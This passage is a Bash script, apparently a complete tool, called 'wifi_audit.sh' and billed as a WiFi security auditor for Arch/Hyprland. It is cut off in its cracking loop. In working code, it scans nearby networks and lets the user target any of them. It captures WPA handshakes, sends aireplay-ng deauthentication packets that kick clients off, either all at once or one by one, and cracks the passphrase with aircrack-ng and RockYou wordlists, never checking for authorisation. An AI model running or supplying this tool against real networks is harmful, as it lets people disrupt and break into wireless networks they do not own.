#!/usr/bin/env bash
# -----------------------------------------------------------------------------
# Name:        wifi_audit.sh
# Description: Automated WiFi Security Auditing Tool for Arch/Hyprland
# Hardware:    Hardware Agnostic (Auto-detects Intel/Atheros/Realtek)
# Author:      Elite DevOps
# Version:     2.2.1 (Bugfixes)
# Requires:    Bash 5.0+
# -----------------------------------------------------------------------------

# Strict mode with better error handling
set -euo pipefail
IFS=$'\n\t'
shopt -s extglob

# Ensure Bash 5.0+ for modern features
if ((BASH_VERSINFO[0] < 5)); then
    printf 'Error: This script requires Bash 5.0 or newer.\n' >&2
    exit 1
fi

# -----------------------------------------------------------------------------
# CONSTANTS & COLORS (ANSI escapes, tput used for capability detection)
# -----------------------------------------------------------------------------
if [[ -t 1 ]] && tput colors &>/dev/null && (($(tput colors) >= 8)); then
    readonly RED=$'\e[0;31m'
    readonly GREEN=$'\e[0;32m'
    readonly YELLOW=$'\e[1;33m'
    readonly BLUE=$'\e[0;34m'
    readonly CYAN=$'\e[0;36m'
    readonly BOLD=$'\e[1m'
    readonly NC=$'\e[0m'
else
    readonly RED='' GREEN='' YELLOW='' BLUE='' CYAN='' BOLD='' NC=''
fi

readonly SCAN_PREFIX="scan_dump"
readonly CLIENT_SCAN_PREFIX="client_scan"
readonly SCRIPT_PID="$$"
readonly SCRIPT_NAME="${0##*/}"

# Global state tracking
declare -g MON_IFACE=""
declare -g PHY_IFACE=""
declare -g ORIGINAL_NM_STATE=""
declare -g HANDSHAKE_DIR=""
declare -g LIST_DIR=""
declare -g TARGET_BSSID=""
declare -g TARGET_CH=""
declare -g TARGET_ESSID=""
declare -g TARGET_ESSID_SAFE=""
declare -g FINAL_WORDLIST=""
declare -ga CONNECTED_CLIENTS=()
declare -g CLEANUP_IN_PROGRESS=0

# -----------------------------------------------------------------------------
# UTILITIES
# -----------------------------------------------------------------------------
log_info()    { printf '%s[INFO]%s %s\n' "$BLUE" "$NC" "$1"; }
log_success() { printf '%s[OK]%s %s\n' "$GREEN" "$NC" "$1"; }
log_warn()    { printf '%s[WARN]%s %s\n' "$YELLOW" "$NC" "$1" >&2; }
log_err()     { printf '%s[ERR]%s %s\n' "$RED" "$NC" "$1" >&2; }
log_debug()   { [[ "${DEBUG:-0}" == "1" ]] && printf '%s[DEBUG]%s %s\n' "$CYAN" "$NC" "$1" >&2 || true; }

# Die with error message
die() {
    log_err "$1"
    exit "${2:-1}"
}

# -----------------------------------------------------------------------------
# AUTO-ELEVATION & USER DETECTION
# -----------------------------------------------------------------------------
if [[ $EUID -ne 0 ]]; then
    log_info "Elevating permissions to root (required for hardware access)..."
    exec sudo --preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR,DISPLAY \
        bash -- "$0" "$@"
fi

# Determine real user (the one who invoked sudo)
if [[ -n "${SUDO_USER:-}" ]]; then
    readonly REAL_USER="$SUDO_USER"
    readonly REAL_HOME="$(getent passwd "$SUDO_USER" | cut -d: -f6)"
    readonly REAL_GROUP="$(id -gn "$SUDO_USER")"
    readonly REAL_UID="$(id -u "$SUDO_USER")"
else
    readonly REAL_USER="$(whoami)"
    readonly REAL_HOME="$HOME"
    readonly REAL_GROUP="$(id -gn)"
    readonly REAL_UID="$(id -u)"
fi

# Validate REAL_HOME exists
[[ -d "$REAL_HOME" ]] || die "User home directory not found: $REAL_HOME"

# Secure temp directory creation with validation (after elevation to prevent orphan on exec)
TMP_DIR="$(mktemp -d -t wifi_audit_XXXXXX 2>/dev/null)" || {
    printf '%s\n' "Error: Failed to create temporary directory" >&2
    exit 1
}
readonly TMP_DIR

# Ensure TMP_DIR is valid
[[ -d "$TMP_DIR" && -w "$TMP_DIR" ]] || {
    printf '%s\n' "Error: Temporary directory is not accessible" >&2
    exit 1
}

# -----------------------------------------------------------------------------
# RUN AS USER
# -----------------------------------------------------------------------------
run_as_user() {
    local xdg="${XDG_RUNTIME_DIR:-/run/user/$REAL_UID}"
    local -a env_args=("XDG_RUNTIME_DIR=$xdg")
    
    # Auto-detect Wayland display if variable was lost by sudo
    local wd="${WAYLAND_DISPLAY:-}"
    if [[ -z "$wd" ]]; then
        local sockets=("$xdg"/wayland-*)
        if [[ -e "${sockets[0]}" ]]; then
            wd="${sockets[0]##*/}"
        fi
    fi

    [[ -n "$wd" ]] && env_args+=("WAYLAND_DISPLAY=$wd")
    [[ -n "${DISPLAY:-}" ]] && env_args+=("DISPLAY=$DISPLAY")
    [[ -n "${DBUS_SESSION_BUS_ADDRESS:-}" ]] && env_args+=("DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS")
    
    sudo -u "$REAL_USER" env "${env_args[@]}" "$@"
}

# -----------------------------------------------------------------------------
# CLIPBOARD
# -----------------------------------------------------------------------------
copy_to_clipboard() {
    local text="$1"
    
    if command -v wl-copy &>/dev/null; then
        if printf '%s' "$text" | run_as_user wl-copy --trim-newline 2>/dev/null; then
            return 0
        fi
    fi
    
    if command -v xclip &>/dev/null; then
        printf '%s' "$text" | run_as_user xclip -selection clipboard 2>/dev/null
        return $?
    elif command -v xsel &>/dev/null; then
        printf '%s' "$text" | run_as_user xsel --clipboard --input 2>/dev/null
        return $?
    fi
    
    return 1
}

# -----------------------------------------------------------------------------
# IMPROVED CLEANUP TRAP (Cherry-picked from v3.0)
# -----------------------------------------------------------------------------
cleanup() {
    local exit_code=$?

    # Prevent re-entrancy (cleanup calling itself)
    ((CLEANUP_IN_PROGRESS)) && return
    CLEANUP_IN_PROGRESS=1
    
    # Block all signals during cleanup
    trap '' EXIT INT TERM HUP QUIT
    
    printf '\n'
    log_info "Initiating cleanup sequence..."

    # 1. Kill child processes gracefully using jobs list (Safer than pkill -P)
    local children
    children=$(jobs -p 2>/dev/null) || true
    if [[ -n "$children" ]]; then
        # shellcheck disable=SC2086
        kill -TERM $children 2>/dev/null || true
        sleep 0.5
        # shellcheck disable=SC2086
        kill -KILL $children 2>/dev/null || true
    fi
    
    # 2. Kill specific tools related to this script instance
    # We use regex to be safe but targeted
    pkill -f "airodump-ng.*${MON_IFACE:-notset}" 2>/dev/null || true
    pkill -f "aireplay-ng.*${MON_IFACE:-notset}" 2>/dev/null || true
    pkill -f "bully.*${MON_IFACE:-notset}" 2>/dev/null || true
    
    sleep 0.5

    # 3. Stop Monitor Interface
    if [[ -n "${MON_IFACE:-}" ]]; then
        if ip link show "$MON_IFACE" &>/dev/null; then
            log_info "Stopping monitor mode on $MON_IFACE..."
            airmon-ng stop "$MON_IFACE" &>/dev/null || true
        fi
    fi

    # 4. Restore NetworkManager
    if [[ "${ORIGINAL_NM_STATE:-}" == "active" ]]; then
        if ! systemctl is-active --quiet NetworkManager; then
            log_info "Restarting NetworkManager..."
            systemctl restart NetworkManager || log_warn "Failed to restart NetworkManager."
        fi
    elif [[ -z "${ORIGINAL_NM_STATE:-}" ]]; then
        # Unknown original state - try to restore anyway
        if ! systemctl is-active --quiet NetworkManager; then
            log_info "Attempting to restart NetworkManager..."
            systemctl start NetworkManager 2>/dev/null || true
        fi
    fi

    # 5. Cleanup Temp Dir
    if [[ -d "$TMP_DIR" ]]; then
        rm -rf -- "$TMP_DIR"
    fi

    log_success "System returned to normal state."
    exit "$exit_code"
}

# Set up traps for multiple signals
trap cleanup EXIT INT TERM HUP QUIT

# -----------------------------------------------------------------------------
# DEPENDENCY CHECK
# -----------------------------------------------------------------------------
check_deps() {
    if systemctl is-active --quiet NetworkManager 2>/dev/null; then
        ORIGINAL_NM_STATE="active"
    else
        ORIGINAL_NM_STATE="inactive"
    fi

    declare -A deps=(
        ["aircrack-ng"]="aircrack-ng"
        ["bully"]="bully"
        ["wash"]="reaver"
        ["gawk"]="gawk"
        ["lspci"]="pciutils"
        ["timeout"]="coreutils"
        ["iw"]="iw"
    )
    
    local -a missing_pkgs=()
    local binary
    
    for binary in "${!deps[@]}"; do
        if ! command -v "$binary" &>/dev/null; then
            missing_pkgs+=("${deps[$binary]}")
        fi
    done

    if ((${#missing_pkgs[@]} > 0)); then
        log_warn "Missing dependencies: ${missing_pkgs[*]}"
        log_info "Installing missing packages..."
        echo "Options:"
        echo "1) Install with existing package database (pacman -S)"
        echo "2) Full system upgrade + install (pacman -Syu) [Recommended]"
        echo "3) Exit and install manually"
        
        local choice
        read -r -p "Selection [2]: " choice
        choice="${choice:-2}"
        
        case "$choice" in
            1) pacman -S --noconfirm --needed "${missing_pkgs[@]}" || die "Failed to install dependencies." ;;
            2) pacman -Syu --noconfirm --needed "${missing_pkgs[@]}" || die "Failed to install dependencies." ;;
            *) log_info "Please install: ${missing_pkgs[*]}"; exit 0 ;;
        esac
    fi
    
    if ! command -v wl-copy &>/dev/null && ! command -v xclip &>/dev/null && ! command -v xsel &>/dev/null; then
        log_warn "No clipboard tools found. Install 'wl-clipboard' (Wayland) or 'xclip' (X11)."
    fi
    
    log_success "All dependencies satisfied."
}

# -----------------------------------------------------------------------------
# PATH VALIDATION
# -----------------------------------------------------------------------------
validate_path() {
    local path="$1"
    [[ -z "$path" ]] && return 1
    
    local dangerous_chars=$'`$();&|<>!*?[]{}\'"\\'
    local char i
    for ((i=0; i<${#dangerous_chars}; i++)); do
        char="${dangerous_chars:i:1}"
        if [[ "$path" == *"$char"* ]]; then
            log_debug "Path contains dangerous character: $char"
            return 1
        fi
    done
    
    if [[ "$path" =~ [[:cntrl:]] ]]; then
        local cleaned="${path//$'\t'/}"
        cleaned="${cleaned//$'\n'/}"
        if [[ "$cleaned" =~ [[:cntrl:]] ]]; then return 1; fi
    fi
    
    if [[ "$path" == -* ]]; then return 1; fi
    return 0
}

# -----------------------------------------------------------------------------
# DIRECTORY SETUP
# -----------------------------------------------------------------------------
setup_directories() {
    local default_project_dir="$REAL_HOME/Documents/wifi_testing"
    local default_handshake_dir="$default_project_dir/handshake"
    local default_list_dir="$default_project_dir/list"

    printf '\n'
    log_info "Configuration: Handshake Storage"
    printf 'Default: %s\n' "$default_handshake_dir"
    
    local user_hs_path
    read -r -p "Press ENTER to use default, or type a custom path: " user_hs_path

    if [[ -z "$user_hs_path" ]]; then
        HANDSHAKE_DIR="$default_handshake_dir"
    elif validate_path "$user_hs_path"; then
        HANDSHAKE_DIR="${user_hs_path%/}"
    else
        log_warn "Invalid characters in path. Using default."
        HANDSHAKE_DIR="$default_handshake_dir"
    fi

    if [[ ! -d "$HANDSHAKE_DIR" ]]; then
        if ! run_as_user mkdir -p -- "$HANDSHAKE_DIR" 2>/dev/null; then
            mkdir -p -- "$HANDSHAKE_DIR" || die "Failed to create handshake directory"
        fi
    fi
    
    if [[ -d "$default_project_dir" ]]; then
        chown -R "$REAL_USER":"$REAL_GROUP" -- "$default_project_dir" 2>/dev/null || true
        chmod -R u=rwX,g=rX,o=rX -- "$default_project_dir" 2>/dev/null || true
    fi

    chown -R "$REAL_USER":"$REAL_GROUP" -- "$HANDSHAKE_DIR" 2>/dev/null || true
    chmod -R u=rwX,g=rX,o=rX -- "$HANDSHAKE_DIR" 2>/dev/null || true
    
    log_success "Handshakes will be saved to: $HANDSHAKE_DIR"

    printf '\n'
    log_info "Configuration: Password Wordlists"
    printf 'Default: %s\n' "$default_list_dir"
    
    local user_list_path
    read -r -p "Press ENTER to use default, or type a custom path: " user_list_path

    if [[ -z "$user_list_path" ]]; then
        LIST_DIR="$default_list_dir"
    elif validate_path "$user_list_path"; then
        LIST_DIR="${user_list_path%/}"
    else
        log_warn "Invalid characters in path. Using default."
        LIST_DIR="$default_list_dir"
    fi

    if [[ ! -d "$LIST_DIR" ]]; then
        if ! run_as_user mkdir -p -- "$LIST_DIR" 2>/dev/null; then
            mkdir -p -- "$LIST_DIR" || die "Failed to create wordlist directory"
        fi
        log_warn "Directory $LIST_DIR created (it is currently empty)."
    fi

    chown -R "$REAL_USER":"$REAL_GROUP" -- "$LIST_DIR" 2>/dev/null || true
    chmod -R u=rwX,g=rX,o=rX -- "$LIST_DIR" 2>/dev/null || true
}

# -----------------------------------------------------------------------------
# INTERFACE SELECTION
# -----------------------------------------------------------------------------
get_interfaces_by_type() {
    local target_type="$1"
    
    iw dev 2>/dev/null | awk -v type="$target_type" '
        $1 == "Interface" { name = $2; next }
        $1 == "type" {
            if ($2 == type && name != "") {
                print name
            }
            name = ""
        }
    '
}

select_interface() {
    log_info "Scanning for wireless interfaces..."
    
    local -a interfaces
    mapfile -t interfaces < <(get_interfaces_by_type "managed")

    if ((${#interfaces[@]} == 0)); then
        local -a monitors
        mapfile -t monitors < <(get_interfaces_by_type "monitor")
        
        if ((${#monitors[@]} > 0)); then
            log_warn "No managed interfaces found, but detected active monitor mode: ${monitors[*]}"
            log_info "Attempting to reset interfaces to normal state..."
            
            local mon
            for mon in "${monitors[@]}"; do
                airmon-ng stop "$mon" &>/dev/null || true
            done
            
            log_info "Waiting for drivers to reset..."
            sleep 2
            
            mapfile -t interfaces < <(get_interfaces_by_type "managed")
            
            if ((${#interfaces[@]} > 0)); then
                log_success "Interface reset successful."
            else
                die "Failed to reset interfaces. Please manually restart your computer or reload wifi modules."
            fi
        else
            die "No wireless interfaces found (Managed or Monitor)."
        fi
    fi

    if ((${#interfaces[@]} == 1)); then
        PHY_IFACE="${interfaces[0]}"
        log_success "Auto-selected interface: $PHY_IFACE"
    else
        printf 'Select interface:\n'
        local PS3="Enter selection: "
        select iface in "${interfaces[@]}"; do
            if [[ -n "$iface" ]]; then
                PHY_IFACE="$iface"
                break
            else
                log_warn "Invalid selection. Try again."
            fi
        done
    fi
    
    [[ -n "${PHY_IFACE:-}" ]] || die "No interface selected."
}

# -----------------------------------------------------------------------------
# HARDWARE OPTIMIZATION & MONITOR MODE
# -----------------------------------------------------------------------------
detect_hardware() {
    if lspci 2>/dev/null | grep -qi "Network controller.*Intel"; then
        log_success "Detected Intel Wi-Fi Hardware."
        return 0
    fi
    log_info "Detected Generic/Other Wi-Fi Hardware."
    return 1
}

enable_monitor_mode() {
    log_info "Killing conflicting processes..."
    airmon-ng check kill &>/dev/null || true

    log_info "Enabling Monitor Mode on $PHY_IFACE..."
    
    local output
    if ! output=$(airmon-ng start "$PHY_IFACE" 2>&1); then
        die "Failed to start monitor mode: $output"
    fi
    
    sleep 1

    MON_IFACE=$(iw dev 2>/dev/null | awk '
        /Interface/ { name = $2; next }
        /type monitor/ { if (name != "") print name; name = "" }
    ' | head -n1)
    
    if [[ -z "$MON_IFACE" ]]; then
        MON_IFACE=$(printf '%s' "$output" | \
            grep -oP 'monitor mode.*enabled on \K[^\)]+' | \
            tr -d '[:space:][]')
    fi
    
    if [[ -z "$MON_IFACE" ]]; then
        for candidate in "${PHY_IFACE}mon" "wlan0mon" "wlan1mon"; do
            if ip link show "$candidate" &>/dev/null; then
                MON_IFACE="$candidate"
                break
            fi
        done
    fi

    [[ -n "$MON_IFACE" ]] || die "Could not determine monitor interface name."

    log_success "Monitor mode active on: $MON_IFACE"
    ip link set "$MON_IFACE" up &>/dev/null || true
    
    if detect_hardware; then
        log_info "Attempting Intel optimizations (Power Save OFF)..."
        if ! iw dev "$MON_IFACE" set power_save off 2>/dev/null; then
            printf '      (Note: Kernel enforced power management active - this is normal for AX201)\n'
        fi
    else
        iw dev "$MON_IFACE" set power_save off 2>/dev/null || true
    fi
}

# -----------------------------------------------------------------------------
# SCANNING
# -----------------------------------------------------------------------------
scan_targets() {
    # Ensure fresh scan data by removing previous files
    rm -f -- "$TMP_DIR/$SCAN_PREFIX"* 2>/dev/null || true

    log_info "Starting network scan (2.4GHz & 5GHz)..."
    log_info "Scanning for 10 seconds. Please wait..."

    local scan_duration=10
    local timeout_duration=$((scan_duration + 10))
    
    timeout --signal=SIGTERM "${timeout_duration}s" \
        airodump-ng --band abg \
        -w "$TMP_DIR/$SCAN_PREFIX" \
        --output-format csv \
        --write-interval 1 \
        -- "$MON_IFACE" &>/dev/null &
    local pid=$!
    
    local i
    for ((i=scan_duration; i>0; i--)); do
        printf '\rScanning... %2d ' "$i"
        sleep 1
    done
    printf '\rScanning... Done.\n'
    
    kill "$pid" &>/dev/null || true
    wait "$pid" 2>/dev/null || true
    sync
    sleep 1

    local csv_file="$TMP_DIR/$SCAN_PREFIX-01.csv"
    [[ -f "$csv_file" ]] || die "Scan failed to generate output."

    log_info "Parsing targets..."
    printf '\n'
    
    local -a target_lines
    
    mapfile -t target_lines < <(gawk -F',' '
        BEGIN { IGNORECASE = 1 }
        /Station MAC/ { exit }
        $1 ~ /^[[:space:]]*([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}[[:space:]]*$/ {
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $9)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14)
            
            bssid = $1
            pwr = $9
            ch = int($4)
            priv = $6
            essid = $14
            
            if (length(essid) < 1) next
            
            if (ch < 1 || ch > 196) {
                band = "N/A"
                ch = 0
            } else if (ch >= 1 && ch <= 14) {
                band = "2.4G"
            } else if (ch >= 32) {
                band = "5G"
            } else {
                band = "N/A"
            }
            
            printf "%s,%s,%d,%s,%s,%s\n", bssid, pwr, ch, band, priv, essid
        }
    ' "$csv_file")

    ((${#target_lines[@]} > 0)) || die "No networks found."

    printf '%s%-3s | %-17s | %-4s | %-4s | %-5s | %-8s | %s%s\n' \
        "$CYAN" "ID" "BSSID" "PWR" "CH" "BAND" "SEC" "ESSID" "$NC"
    printf '%.0s-' {1..75}
    printf '\n'

    local -a bssids=() channels=() essids=()
    local i=1 line bssid pwr ch band priv essid

    for line in "${target_lines[@]}"; do
        IFS=',' read -r bssid pwr ch band priv essid <<< "$line"
        bssids+=("$bssid")
        channels+=("$ch")
        essids+=("$essid")
        
        printf '%-3d | %s | %-4s | %-4s | %-5s | %-8s | %s\n' \
            "$i" "$bssid" "$pwr" "$ch" "$band" "$priv" "$essid"
        ((i++))
    done

    printf '\n'
    
    local selection
    while true; do
        read -r -p "Select Target ID: " selection

        if [[ "$selection" =~ ^[0-9]+$ ]] && \
           ((selection >= 1 && selection <= ${#bssids[@]})); then
            break
        fi
        log_warn "Invalid selection. Please enter a number between 1 and ${#bssids[@]}."
    done

    local idx=$((selection - 1))
    TARGET_BSSID="${bssids[idx]}"
    TARGET_CH="${channels[idx]}"
    TARGET_ESSID="${essids[idx]}"
    
    TARGET_ESSID_SAFE="${TARGET_ESSID//[^a-zA-Z0-9_-]/_}"
    TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE//+(_)/_}"
    TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE#_}"
    TARGET_ESSID_SAFE="${TARGET_ESSID_SAFE%_}"
    [[ -n "$TARGET_ESSID_SAFE" ]] || TARGET_ESSID_SAFE="network"

    log_success "Target Locked: $TARGET_ESSID ($TARGET_BSSID) on CH $TARGET_CH"
}

# -----------------------------------------------------------------------------
# ROCKYOU FINDER
# -----------------------------------------------------------------------------
find_rockyou() {
    local -a paths=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz"
        "$REAL_HOME/wordlists/rockyou.txt"
        "$REAL_HOME/.wordlists/rockyou.txt"
        "/opt/wordlists/rockyou.txt"
        "/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt"
    )
    
    local p
    for p in "${paths[@]}"; do
        if [[ -f "$p" && -r "$p" ]]; then
            printf '%s' "$p"
            return 0
        fi
    done
    return 1
}

# -----------------------------------------------------------------------------
# WORDLIST PREPARATION
# -----------------------------------------------------------------------------
prepare_wordlist() {
    log_info "Preparing Wordlists from: $LIST_DIR"
    
    local -a list_files
    mapfile -t list_files < <(find "$LIST_DIR" -maxdepth 1 -type f 2>/dev/null | sort)
    
    if ((${#list_files[@]} > 0)); then
        log_info "Found ${#list_files[@]} password list(s). Merging..."
        local combined_wordlist="$TMP_DIR/combined_passwords.txt"
        if cat -- "${list_files[@]}" > "$combined_wordlist" 2>/dev/null; then
            local count
            count=$(wc -l < "$combined_wordlist")
            log_success "Merged wordlist created with $count passwords."
            FINAL_WORDLIST="$combined_wordlist"
        else
            log_warn "Failed to merge some wordlist files."
            FINAL_WORDLIST=""
        fi
    else
        log_warn "No files found in $LIST_DIR."
        local rockyou_path=""
        if rockyou_path=$(find_rockyou); then
            printf 'Options:\n'
            printf '1) Use detected RockYou (%s)\n' "$rockyou_path"
            printf '2) Enter custom path manually\n'
            
            local wl_select
            read -r -p "Selection [1/2] (Default 1): " wl_select
            wl_select="${wl_select:-1}"
            
            case "$wl_select" in
                2)
                    local custom_wl
                    read -r -p "Enter full path to wordlist: " custom_wl
                    if [[ -f "$custom_wl" && -r "$custom_wl" ]]; then
                        FINAL_WORDLIST="$custom_wl"
                    else
                        log_err "File not found or not readable."
                        FINAL_WORDLIST=""
                    fi
                    ;;
                *)
                    if [[ "$rockyou_path" == *.gz ]]; then
                        log_info "Decompressing rockyou.txt.gz..."
                        FINAL_WORDLIST="$TMP_DIR/rockyou.txt"
                        if ! zcat -- "$rockyou_path" > "$FINAL_WORDLIST" 2>/dev/null; then
                            log_warn "Failed to decompress rockyou.txt.gz"
                            FINAL_WORDLIST=""
                        fi
                    else
                        FINAL_WORDLIST="$rockyou_path"
                    fi
                    ;;
            esac
        else
            log_warn "RockYou wordlist not found in common locations."
            log_info "Common install: sudo pacman -S seclists (or download rockyou.txt manually)"
            
            local custom_wl
            read -r -p "Enter full path to wordlist (or press ENTER to skip cracking): " custom_wl
            
            if [[ -n "$custom_wl" && -f "$custom_wl" && -r "$custom_wl" ]]; then
                FINAL_WORDLIST="$custom_wl"
            else
                log_warn "No wordlist provided. Cracking will be skipped."
                FINAL_WORDLIST=""
            fi
        fi
    fi
}

# -----------------------------------------------------------------------------
# CLIENT SCANNING
# -----------------------------------------------------------------------------
get_connected_clients() {
    local custom_csv="${1:-}"
    local specific_csv="$TMP_DIR/$CLIENT_SCAN_PREFIX-01.csv"
    local initial_csv="$TMP_DIR/$SCAN_PREFIX-01.csv"
    local source_csv=""

    if [[ -n "$custom_csv" ]]; then
        local attempts=0
        while [[ ! -f "$custom_csv" ]] && ((attempts < 5)); do
            sleep 1
            ((++attempts))
        done
        [[ -f "$custom_csv" ]] && source_csv="$custom_csv"
    fi
    
    if [[ -z "$source_csv" ]]; then
        if [[ -f "$specific_csv" ]]; then
            source_csv="$specific_csv"
        elif [[ -f "$initial_csv" ]]; then
            source_csv="$initial_csv"
        else
            CONNECTED_CLIENTS=()
            return
        fi
    fi

    mapfile -t CONNECTED_CLIENTS < <(gawk -F',' -v target="$TARGET_BSSID" '
        BEGIN { IGNORECASE = 1 }
        { gsub(/\r/, "") }
        /Station MAC/ { in_stations = 1; next }
        in_stations == 1 {
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $3)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4)
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6)
            
            last_seen_str = $3
            gsub(/[-:]/, " ", last_seen_str)
            last_seen_ts = mktime(last_seen_str)
            current_ts = systime()
            
            if (last_seen_ts > 0 && (current_ts - last_seen_ts) > 60) {
                next
            }

            if (toupper($6) == toupper(target) && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/) {
                printf "%s,%s\n", $1, $4
            }
        }
    ' "$source_csv" 2>/dev/null)
}

# -----------------------------------------------------------------------------
# ATTACK: WPA HANDSHAKE
# -----------------------------------------------------------------------------
attack_wpa_handshake() {
    prepare_wordlist
    
    if [[ -z "${FINAL_WORDLIST:-}" ]] || [[ ! -f "${FINAL_WORDLIST:-}" ]]; then
        log_warn "No valid wordlist found. Capture will proceed but cracking will be skipped."
    fi

    # L1: Main retry loop (replaces recursive calls)
    while true; do
        local timestamp
        timestamp=$(date +%Y%m%d_%H%M%S)
        local capture_base="${HANDSHAKE_DIR}/${TARGET_ESSID_SAFE}_${timestamp}"
        
        local record_cmd
        record_cmd="sudo airodump-ng -c ${TARGET_CH} --bssid ${TARGET_BSSID} -w '${capture_base}' ${MON_IFACE}"

        printf '\n'
        log_info "Step 1: Handshake Capture"
        printf '1. The %scapture command%s has been prepared.\n' "$CYAN" "$NC"
        printf '2. Open a new terminal.\n'
        printf '3. Paste and run it.\n'
        printf '4. Return here and press ENTER.\n\n'
        
        if copy_to_clipboard "$record_cmd"; then
            log_success "Command copied to clipboard!"
        else
            log_warn "Clipboard tool not available. Copy manually:"
            printf '%s\n' "$record_cmd"
        fi

        read -r -p "Press ENTER when recorder is running..."

        local target_mac=""
        local user_capture_csv="${capture_base}-01.csv"

        # L2: Client selection master loop
        while true; do

            # L3: Client picker sub-loop
            while true; do
                get_connected_clients "$user_capture_csv"
                
                printf '\nTarget Selection:\n'
                printf '1) Broadcast Deauth (Kick Everyone)\n'
                
                local c=2
                if ((${#CONNECTED_CLIENTS[@]} > 0)); then
                    local client mac pwr
                    for client in "${CONNECTED_CLIENTS[@]}"; do
                        IFS=',' read -r mac pwr <<< "$client"
                        printf '%d) Specific Client: %s (Signal: %s dBm)\n' "$c" "$mac" "${pwr:-?}"
                        ((c++))
                    done
                else
                    printf '   (No connected clients found yet)\n'
                fi
                
                printf 'r) Refresh Client List (Read Capture File)\n'
                
                local sel
                read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
                sel="${sel:-1}"
                
                if [[ "${sel,,}" == "r" ]]; then
                    log_info "Reloading client data from capture file..."
                    sleep 0.5
                    continue  # stay in L3
                fi
                
                if [[ "$sel" =~ ^[0-9]+$ ]]; then
                    if ((sel == 1)); then
                        log_info "Targeting Broadcast (All Clients)"
                        target_mac=""
                        break  # exit L3
                    elif ((sel > 1 && sel < c)); then
                        local client_idx=$((sel - 2))
                        local selected_line="${CONNECTED_CLIENTS[client_idx]}"
                        local raw_mac="${selected_line%%,*}"
                        target_mac="${raw_mac//[^0-9A-Fa-f:]/}"
                        
                        if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                            log_info "Targeting specific client: $target_mac"
                            break  # exit L3
                        else
                            log_warn "Invalid MAC detected. Try rescanning."
                        fi
                    else
                        log_err "Invalid selection."
                    fi
                else
                    log_err "Invalid selection."
                fi
            done

            printf '\n'
            log_info "Step 2: Sending Deauth Packets"
            
            # Deauth attack loop
            while true; do
                local burst=1 # Change this value to adjust burst size
                log_info "Sending $burst groups of deauth packets..."

                if [[ -n "$target_mac" ]]; then
                    timeout --signal=SIGTERM 30s \
                        aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" -- "$MON_IFACE" || true
                else
                    timeout --signal=SIGTERM 30s \
                        aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -- "$MON_IFACE" || true
                fi

                printf '\n'
                log_success "Deauth burst complete."
                printf "Check your other terminal for 'WPA Handshake: ...'\n"

                # Menu prompt loop (typo-safe re-prompt)
                while true; do
                    printf 'Options:\n'
                    printf 'y) Yes, captured - Start Cracking\n'
                    printf 'n) No, stop attack\n'
                    printf 'r) Retry Deauth (Send more packets)\n'
                    printf 'b) Back to Client Selection\n'
                    printf 't) Back to Target (Network) Selection\n'
                    
                    local cap_choice
                    read -r -p "Choice [y/n/r/b/t] (Default: r): " cap_choice
                    cap_choice="${cap_choice:-r}"
                    
                    case "${cap_choice,,}" in
                        y) break 3 ;;   # exit menu + deauth + client selection → cracking
                        n)
                            log_info "Aborting attack."
                            return 0
                            ;;
                        b) break 2 ;;   # exit menu + deauth → back to client selection
                        t) return 2 ;;  # exit function → rescan networks
                        r) break ;;     # exit menu → top of deauth loop (re-send)
                        *)
                            log_warn "Invalid option. Please try again."
                            continue    # re-prompt within menu loop
                            ;;
                    esac
                done
            done
        done
        
        local cap_file="${capture_base}-01.cap"
        
        if [[ ! -f "$cap_file" ]]; then
            local found_cap
            found_cap=$(find "$HANDSHAKE_DIR" -maxdepth 1 \
                -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" \
                -type f 2>/dev/null | head -n1)
            [[ -n "$found_cap" ]] && cap_file="$found_cap"
        fi

        if [[ -f "$cap_file" ]]; then
            chown "$REAL_USER":"$REAL_GROUP" -- "${capture_base}"* 2>/dev/null || true
            log_info "Capture files ownership transferred to $REAL_USER."
        fi

        # Crack attempt loop
        while true; do
            if [[ -n "${FINAL_WORDLIST:-}" && -f "${FINAL_WORDLIST:-}" && -f "$cap_file" ]]; then
                log_info "Step 3: Cracking Password..."
                
                local key_file="$TMP_DIR/cracked_key.txt"
                rm -f -- "$key_file"
                
                aircrack-ng -w "$FINAL_WORDLIST" -l "$key_file" -- "$cap_file" || true
                
                if [[ -f "$key_file" && -s "$key_file" ]]; then
                    local cracked_key
                    cracked_key=$(<"$key_file")
                    
                    printf '\n'
                    printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
                    printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
                    printf '%s%s* PASSWORD CRACKED !!!                 *%s\n' "$GREEN" "$BOLD" "$NC"
                    printf '%s%s* *%s\n' "$GREEN" "$BOLD" "$NC"
                    printf '%s%s**************************************************%s\n' "$GREEN" "$BOLD" "$NC"
                    printf '\n'
                    printf '%s%s   PASSPHRASE:  %s%s\n' "$CYAN" "$BOLD" "$cracked_key" "$NC"
                    printf '\n'
                    
                    if copy_to_clipboard "$cracked_key"; then
                        log_success "Password copied to clipboard!"
                    fi
                    return 0 # Success exit
                else
                    log_warn "Password not found OR handshake invalid."
                fi
